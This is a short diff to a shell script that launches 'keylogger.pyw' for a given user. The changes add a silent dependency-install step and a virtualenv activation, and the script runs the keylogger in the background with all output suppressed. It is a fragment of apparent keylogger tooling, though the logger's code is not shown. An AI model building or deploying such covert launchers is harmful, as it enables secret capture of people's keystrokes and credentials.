@@ -1,4 +1,5 @@
 #!/bin/sh 
+
 if [ $# -lt 1 ]; then
     echo "[ERROR] Invalid usage";
     echo "[INFO] Correct usage: run <user> [install]";
@@ -13,10 +14,8 @@ if [ $# -ge 2 ]; then
 fi
 
 if [ $LOG_INSTALL == "true" ]; then
-  echo "install is true" > /dev/null 2>&1;
+  sh ./initialize/installDependencies > /dev/null 2>&1;
 #install python
-#install python scripts
-#ignore output= > /dev/null 2>&1
 fi
 
-python3 keylogger.pyw $1 > /dev/null 2>&1 &
+source venv/bin/activate; python3 keylogger.pyw $1 > /dev/null 2>&1 &
